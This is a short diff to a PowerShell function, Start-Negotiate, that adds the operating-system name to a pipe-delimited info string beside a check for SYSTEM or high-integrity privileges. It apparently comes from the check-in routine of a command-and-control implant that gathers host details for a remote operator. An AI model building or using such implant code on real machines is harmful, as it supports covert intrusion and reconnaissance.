@@ -180,6 +180,9 @@ function Start-Negotiate {
     catch{
         $i+='|'+'[FAILED]'
     }
+    $os = (Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
+    if(!$os -or $os.trim() -eq '') {$os='Windows ?'};
+    $i+="|$os";
 
     # detect if we're SYSTEM or otherwise high-integrity
     if(([Environment]::UserName).ToLower() -eq "system"){$i+="|True"}
